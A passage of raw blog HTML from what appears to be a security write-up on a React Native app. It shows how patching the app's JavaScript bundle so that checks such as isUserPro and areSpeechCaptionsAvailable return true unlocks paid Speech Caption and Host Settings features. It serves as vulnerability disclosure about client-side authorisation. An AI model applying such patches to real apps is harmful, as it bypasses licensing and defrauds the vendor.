360w,\n/static/baf9e3d7d25857a9cae45777ec39363e/37523/s-code-9.png 720w,\n/static/baf9e3d7d25857a9cae45777ec39363e/98314/s-code-9.png 817w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>In order for the App to check User Profile information for the User at entrypoint during operation, it currently receives data on <code class=\"language-text\">permissions</code> while performing session management through okHttp communication.</li>\n<li>If it is a Pro function, it contains a <code class=\"language-text\">PRO</code> string, which returns the Boolean value to the <code class=\"language-text\">isUserPro</code> object after checking whether the <code class=\"language-text\">UPGRADE_PRO</code> string is included in the next Pro function condition test section.</li>\n</ul>\n<p><strong>abnormal flow (code patch)</strong>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAuUlEQVQY05WOOW4CQRAA9zPWrKfnpHsuaUGLEz/TvyDhB7CIAMQjEHTgwCFteWXJkjOCUqmy6mxoW5/HL5fHm8WBkdZMZc0hDQyhMITKECu/2sQKkHtDs/9xV4CfCvDSaZsPkd4k1fdHxqUgjRJpJT4NAqEIxCoQqoAvs81v/7mJWbS5tS/XTrt8drZKcE2iy6JdkhcdRQFKb+gpfi4778oH+XxCl3YmtGmRV1NvaFKAz7BXgEcFuPkGXet2Tu4NpLsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"abnormal Flow\"\n        title=\"abnormal Flow\"\n        src=\"/static/7f96db5db91ff784789c6030c21416b4/37523/s-code-10.png\"\n        srcset=\"/static/7f96db5db91ff784789c6030c21416b4/e9ff0/s-code-10.png 180w,\n/static/7f96db5db91ff784789c6030c21416b4/f21e7/s-code-10.png 360w,\n/static/7f96db5db91ff784789c6030c21416b4/37523/s-code-10.png 720w,\n/static/7f96db5db91ff784789c6030c21416b4/0fb99/s-code-10.png 965w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<ul>\n<li>In the process of performing the User Profile inspection on the server side, authentication is performed on the user, but the actual React Native Javascript side is vulnerable to Client Code Injection because only condition processing is implemented on the Client-side based on authentication on the user.</li>\n</ul>\n<h3 id=\"code-path-poc\" style=\"position:relative;\"><a href=\"#code-path-poc\" aria-label=\"code path poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Path (POC)</h3>\n<ul>\n<li>The part where the internal logic for <code class=\"language-text\">isUserPro</code> function is received from the server and permissions is checked is returned to True unconditionally so that the Pro function can be used without actual permission, allowing all data flows to be modulated.</li>\n</ul>\n<p><strong>normal flow (React Native Javascript: Index.android.bundle Speech Caption Feature (Pro))</strong></p>\n<ul>\n<li>When using the Pro service, you can use the <code class=\"language-text\">Speech Caption</code> function, and it is an automatic translation system that translates the language you speak into a language that the other party can understand when communicating with Voice and provides it in the form of captions.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 59.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAAB7ElEQVQoz4WSS44TMRCG+zBMp9vvt92PDElmFCBwUa7AGUBZQC+QWIB6xRnA+lE7ySijAWbxqcplu+ovuyqm4gcmwk9C7Q/K3NwyPxPhZibDTKWfqfDzEids8WNZkwUeZiLC3DA3r6i92O+VkvFr37/GML7FMB7g4yvYMED7COUTtIlQPECKAKkGKBMhTYSQA4Tu0XCHFbVomCtULXNfxu0G92/ufvtxn23/LjvbZ6lDptznG2JyTW1eUZtrevJPa3PG5oa53FBX/EqqbtpvX+Kwv82h28KkA5Ib4BclMqJloVReVDzlcbwo1CpNfdyhi/e5C1tYs4axCdYlKN3D2FtwndByByL8gyV8wYGKk70UrQh3k/cDXNzk2I1QOkAsKF+QOjygTAJXAdrG8pbLuaW41BHkkrBldiIiwep1jmGDrlsUBaxKq74cqi+QU2uLvY7V1y03zE1cxJIwhBH9uIb2CczcgqsezdUPPsdZoZukSlBuyFKnsvGCGNREo6bmyUdcLv4racVk/KxUApfhlxA+C+6yFDELETMXITPuM+c+MxHLeJQxOY/R36gI99+sHTGsl+Heo087BLuBsyO48GD8QjypY/9/gqqm5n3LwsTd3Sdqd0dmNkeqx2PL7PGGmGNN7RlzXFH7HB//ADo7b0Psg1qUAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Speech Caption Feature normalFlow\"\n        title=\"Speech Caption Feature normalFlow\"\n        src=\"/static/b84890bb4698e3c112d7d3173c76d14e/37523/s-code-11.png\"\n        srcset=\"/static/b84890bb4698e3c112d7d3173c76d14e/e9ff0/s-code-11.png 180w,\n/static/b84890bb4698e3c112d7d3173c76d14e/f21e7/s-code-11.png 360w,\n/static/b84890bb4698e3c112d7d3173c76d14e/37523/s-code-11.png 720w,\n/static/b84890bb4698e3c112d7d3173c76d14e/e996b/s-code-11.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>This function is also a logic that can be used after performing a user profile inspection, performing a user profile, and checking whether the user can use the Pro function in the Room Session.</li>\n<li>Among the logic to check whether the Speech Caption function is available, the server again inserts the returned data through user profile inspection in two guest houses, <code class=\"language-text\">areSpeech CaptionsAvailable</code> and <code class=\"language-text\">userProfile</code>, passing through branch conditions for the previous <code class=\"language-text\">isUserPro</code> object.</li>\n<li>If all three objects <code class=\"language-text\">isUserPro</code>, <code class=\"language-text\">areSpeechCaptionAvailable</code>, and <code class=\"language-text\">userProfile</code> are true, the UI function <code class=\"language-text\">showSpeechCaptionSetting</code> can be activated.</li>\n</ul>\n<p><strong>abnormal flow (code patch)</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 715px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABGElEQVQY033PXUrDQBAH8JwmG2eyyWYmH01Sm5b4YGpA8BQepvRFvINX0UdfRPdR8A51WUaaFhQCPvyYGRj+zARN0X7mpvqIgW0KZA2WVgNbDWQTyKwGY/WFsQmQTZFnNLJVyO8K+UshPwUjLWSgRq7LpdxSKXdlJ9uikS4hWSe19GkrPbWySnJpgaTFX0skqZBExblEcS4K+TUIkSVJa7fajH65GX3Tbf3l5sbXTe+zbOUzWnsqOg9p5RWyV3E+h/x9DnwJjg3q4mCqwZl6dGYxuHQxODrW8sqZsneJLlwI5KI4dxGyi+I/cHI4Bz4H50bU8fQZlghP70ymeW7aO+W8BQroQQHtFPJ+jvYKTsL/7RTQYwh0/wNcFa6uJI4jiwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Speech Catpion Feature abnormal flow\"\n        title=\"Speech Catpion Feature abnormal flow\"\n        src=\"/static/9cd6493dd9c928938575a5d9622a692e/d0c0e/s-code-12.png\"\n        srcset=\"/static/9cd6493dd9c928938575a5d9622a692e/e9ff0/s-code-12.png 180w,\n/static/9cd6493dd9c928938575a5d9622a692e/f21e7/s-code-12.png 360w,\n/static/9cd6493dd9c928938575a5d9622a692e/d0c0e/s-code-12.png 715w\"\n        sizes=\"(max-width: 715px) 100vw, 715px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"vulnerability-1\" style=\"position:relative;\"><a href=\"#vulnerability-1\" aria-label=\"vulnerability 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<ul>\n<li>Client Code Injection vulnerability exists because Client-side blocked the activation of the Pro function with the UI concept.</li>\n</ul>\n<h3 id=\"code-path-poc-1\" style=\"position:relative;\"><a href=\"#code-path-poc-1\" aria-label=\"code path poc 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Path (POC)</h3>\n<ul>\n<li>Change the return value of the areSpeechCaptureAvailable function to True to activate the UI button function so that the showSpeechCaptureSettings UI can be used as the event handler of the UI button.</li>\n</ul>\n<p><strong>normal flow (React Native Javascript: index.android.bundle SpeechCaptions Unlocked</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 715px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAz0lEQVQY00XJS27CQBBFUW/GbndX/6vbX5w464xEBlkMlpClZAATFvMijCGDo1tPVUjXHIVOVzLpHGxe/Utaa53WUsWXSoW9cRX0ryI+C+JLRfG7ML69+NhjwyNcHBB4gAv7di2sySDboLYNjEmodUKpGKWMWwVFVCpCEN+K5Lrrexzw9HZv6Ld73t3viUf06YDEB1jXoe0HTPOEbhhheIbPHzCuvRWC+FMS/0rNJ0m8KOJlq36o6eH5qyhtW7u82Ngs2udFmuakbPtTa/76A/Fmc+7gvsN2AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"SpeechCaptions unlocked normal flow\"\n        title=\"SpeechCaptions unlocked normal flow\"\n        src=\"/static/5ac7dc43b32d5b8a3c7bdea893bdb725/d0c0e/s-code-13.png\"\n        srcset=\"/static/5ac7dc43b32d5b8a3c7bdea893bdb725/e9ff0/s-code-13.png 180w,\n/static/5ac7dc43b32d5b8a3c7bdea893bdb725/f21e7/s-code-13.png 360w,\n/static/5ac7dc43b32d5b8a3c7bdea893bdb725/d0c0e/s-code-13.png 715w\"\n        sizes=\"(max-width: 715px) 100vw, 715px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>The logic that can perform the function in the actual client is that the data of the <code class=\"language-text\">areSpeechCaptionsUnlocked</code> object on the next 71402 line must also contain the string “SPEECH_CAPTONING” and can perform the professional function through userProfile inspection.</li>\n</ul>\n<p><strong>abnormal flow (code patch)</strong>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqElEQVQI13XHyxWCMBBAUWpRMJLfkAmZBD8N2oWFkAU9uHEW2sl4QLcu7nnnNQNObxjK03li79LG/roCl5hc4mIjW5vYAHFIhQGJNRS2MHFvx6cy8aVMvDc4FAmQN4MnCZ4EPAlCFvw1e5KzS+IciQ9Z0nSSmItYvIrHi/R2FGVW8dFol5ZW49xprP/sNdadwXow32+PobZHrAcdateHqkyclYmL0nj7AB8qVItHNbwkAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"SpeechCaptions unlocked abnormal flow\"\n        title=\"SpeechCaptions unlocked abnormal flow\"\n        src=\"/static/08c1e895823677e4c0597b6998ba0885/37523/s-code-14.png\"\n        srcset=\"/static/08c1e895823677e4c0597b6998ba0885/e9ff0/s-code-14.png 180w,\n/static/08c1e895823677e4c0597b6998ba0885/f21e7/s-code-14.png 360w,\n/static/08c1e895823677e4c0597b6998ba0885/37523/s-code-14.png 720w,\n/static/08c1e895823677e4c0597b6998ba0885/40601/s-code-14.png 945w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"vulnerability-2\" style=\"position:relative;\"><a href=\"#vulnerability-2\" aria-label=\"vulnerability 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<ul>\n<li>Client Code Injection vulnerability exists because Client-side blocked the activation of the Pro function with the UI concept.</li>\n</ul>\n<h3 id=\"code-path-poc-2\" style=\"position:relative;\"><a href=\"#code-path-poc-2\" aria-label=\"code path poc 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Path (POC)</h3>\n<ul>\n<li>The final correction is completed by manipulating the data flow by manipulating the conditions of the data insertion part of the unitAppState with the true value as follows.</li>\n</ul>\n<p><strong>normal flow (React Native Javascript: Host Settings (PRO))</strong></p>\n<ul>\n<li>The Host Settings function that can be used in the Host authority is one of the Pro functions that can use various Space internal settings, authority changes, and user eviction functions.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABsUlEQVQoz43Sz27UMBAG8H0YGmfjv/HYsZ3sZtPdhUo8D0eehCtwgqcArkVhb+XAe6DG+lDSldqiVurhp5Fs6bNHMytld58SpZto4s8r6sY31I4Hm8YjteN+VqfxtevGzqZRCRq1cEstOY3s3jXj9Idxer+qVLwhE1DrAK8DgokIOsDVCdokkA6LUjgw/oBwy9lDjNOXFRM0FsKhEO62kD6/4i4XwuVSulwKyhfrOl9wmwtOuZzNd/9hnP6eAz+uaptOod2hibvsfIdhP8CnLUw4wMQjtNtDywAjG1TKo6hqsKpGwWnBOM2/uz0Hfl5JE06b7SXatMt97DB0G0gdYN0RNR1gXY/YdSDfQtgekgZIdwmjA4yaH2nmoPtArsMppB6x3eYUNmh9j0g7EA1QuoUxEbWPkDai0i14vVlI1UA9FVjJ5tT2exyOh9w1A/p0hWH7FinsQcpD67AMoagsGLdg1Z1nWy4FjVw2IBVvSTaT82Ha9N3kbJisCtNauIlxmkrhnvVoKKX0v5X0WIu7VXhqHV6Kcfq6Wkv/oeB0XXD7nXH7Y1Gd68t9Y9z+Kir77h9VBiu3lIYS8wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Host Settings normal flow\"\n        title=\"Host Settings normal flow\"\n        src=\"/static/c27c1bc5bb2b30e414f359ca7fb71bbc/37523/s-code-15.png\"\n        srcset=\"/static/c27c1bc5bb2b30e414f359ca7fb71bbc/e9ff0/s-code-15.png 180w,\n/static/c27c1bc5bb2b30e414f359ca7fb71bbc/f21e7/s-code-15.png 360w,\n/static/c27c1bc5bb2b30e414f359ca7fb71bbc/37523/s-code-15.png 720w,\n/static/c27c1bc5bb2b30e414f359ca7fb71bbc/b2982/s-code-15.png 729w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>When the isUserPro object is activated, it goes to the logic related to the HostSettings UI function and checks for activation, and when the T and A variables are respectively True, the UI of the function can be used.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">, A = (0, c.areAdministratorToolsActive)(o)\n, T = (0,c.isUserRoomOwner)(o, p.userID)</code></pre></div>\n<ul>\n<li><code class=\"language-text\">areAdministratorToolsActive</code> :→ True</li>\n<li>Based on the current userID, the server profile received from the server side should be checked once again from the isUserRoomOwner function to confirm whether it is the owner and the returned result should be True.</li>\n</ul>\n<p><strong>abnormal flow (code patch)</strong></p>\n<p><code class=\"language-text\">}, \"Host Settings\"), false &amp;&amp; s.default.createElement(l.View, {</code></p>\n<ul>\n<li>In order to activate the corresponding UI function, the data flow is changed so that the next UI function can be released and used.</li>\n</ul>\n<h2 id=\"vulnerability-3\" style=\"position:relative;\"><a href=\"#vulnerability-3\" aria-label=\"vulnerability 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<ul>\n<li>Client Code Injection vulnerability exists because Client-side blocked the activation of the Pro function with the UI concept.</li>\n</ul>\n<p><strong>normal flow (React Native Javascript: Host Settings (PRO))</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 69.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC3klEQVQ4y12TSY7bRhiFdZiWKA7qllgDa2QNnORud9oGEl8ti9wgi1wh0dKLBEYiGIKBAMk1bBIvIFtGGl48/FW1+Op//6tapTv2yyYj/2RZ+THPysusNCsvN2l5WWfP2lzrOn0+/6okJ5dtQeb6McnJv0lOfl7dHsSnSmqwSoJXCvxr5RKUCjCucCAajGsIoaDVvJYQQiO/47hJS2wLumgGr4Qwf33/w4CHh+bL43ft9PSmm44PzdQLOw3MTJGayVZuCi5Oj0OcXg9xejw206suTNG7SSozbQv6JcnJDPxjxbg6379u0EQ3tZ1HPwT46OCoQSAWjmrYgwSnFkYaHEi1dLgvK3AmUQmN7Y6NV+CHVZLTMyUS0daTEhpWGzhtIKWHpB6mUhBcwdcOSmmUVKK4Y9jtOdYZwTotZ9B4tfxhtcnIueIK98fZgsXQegxdQHA1PFFoWQ3FAubL5s6qSi3gAxFIrrPbFvQFMCfnimkcYze1rkXjA7yx0EJDHSQMNRDEgXMDX9dQUsMaC6UMCJXPwJcdJgU9l0wjhnZyrkGIAWq2rDTknPacNBNL0lLOo9CojV0Sn8HFvsIm+8Yy5Qr90U/GGYTGIbQO2lrYUi2BiL2EoAbWOnhn4WsLby2MNksoeyLGJL8C1xk5C2Hw9NQtKb+6b3C8j3DRIVCNSDTqUsEQhYooRB3h64g++qXTvnFogh/TW/4MvEnJWSmLd++G6Xgf8OZth6e3Pdo+oGUGAzUwxGAwDbq6RR8ihqZB34RljnsikN+xMd39b/nP+RcMXffZ+2b00Y26NiOXamR7MVZ7MdJbPpYHPSrlRl7JUQg1aqVHKfWY7ti4ycrP13f4+2pb0L+zgkGICBcGqDriwAJ2ZUROHHLisSstsoJinZVzAIvWV82gF1/vskpy8tM2L9/vqfvtINpTKZoTlf3p9k6etgU9pTt+Sgt22ubklLzQN/tfk5y8T/Lyx/8Ad8m+ATfkiGwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Host Settings (pro) normal flow\"\n        title=\"Host Settings (pro) normal flow\"\n        src=\"/static/27f8af20150d6c655c00244d23f0c463/37523/s-code-16.png\"\n        srcset=\"/static/27f8af20150d6c655c00244d23f0c463/e9ff0/s-code-16.png 180w,\n/static/27f8af20150d6c655c00244d23f0c463/f21e7/s-code-16.png 360w,\n/static/27f8af20150d6c655c00244d23f0c463/37523/s-code-16.png 720w,\n/static/27f8af20150d6c655c00244d23f0c463/d26aa/s-code-16.png 839w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>In order to activate all of the Host Settings function internal setting functions, function check function v performs functions on the Unity side through actual Unity Process IPC communication after securing objects for each attribute.</li>\n</ul>\n<p><strong>abnormal flow (code path)</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABUUlEQVQY013PO27cMBQFUK3G0pgfUfy+R1EfKMYMbO83ZVbgIsgCUgV0ZTBVkMLkCzwxgiTFwb3VBW43avxkPf4ATC/WYdEWinFQXHjrWLhy5VbYwrgtA7flhpnSM1OG9/zL956Z5y7g/vl8bPR4Oej8Yadj32jfNrrcH3T/cNDl4aC7u532kGiZIgUFNEpPPTM0cPuPnpnaBb8+AURCnF8BYkOITVtsHuYWl9TmdWlxTS342MIIDRQ0p6AN3P7vbfBnx4V/chOS0/DqJqhOQzVmrTivFRAqxrl6iNU6rCmlqj1WC1gnC1VLX4Vw9YaZ2jPTroMDt19mv9ACM62QaMVEYCMtuFGaz5SWlQAjQYjkNJLx7wKS9khKBVLSk5T+ers7CfdRTvAyKv9tVD6ryWc5+iwEZDmmzMaQB2bySdg8cJtvpftN2D954lfPPTNffwHvn7yKeceTRAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Host Settings (pro) abnormal flow\"\n        title=\"Host Settings (pro) abnormal flow\"\n        src=\"/static/1e534f235e974c2f7631078624ef5917/37523/s-code-17.png\"\n        srcset=\"/static/1e534f235e974c2f7631078624ef5917/e9ff0/s-code-17.png 180w,\n/static/1e534f235e974c2f7631078624ef5917/f21e7/s-code-17.png 360w,\n/static/1e534f235e974c2f7631078624ef5917/37523/s-code-17.png 720w,\n/static/1e534f235e974c2f7631078624ef5917/2e694/s-code-17.png 1048w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"vulnerability-4\" style=\"position:relative;\"><a href=\"#vulnerability-4\" aria-label=\"vulnerability 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>CodePathClient Code Injection vulnerability exists 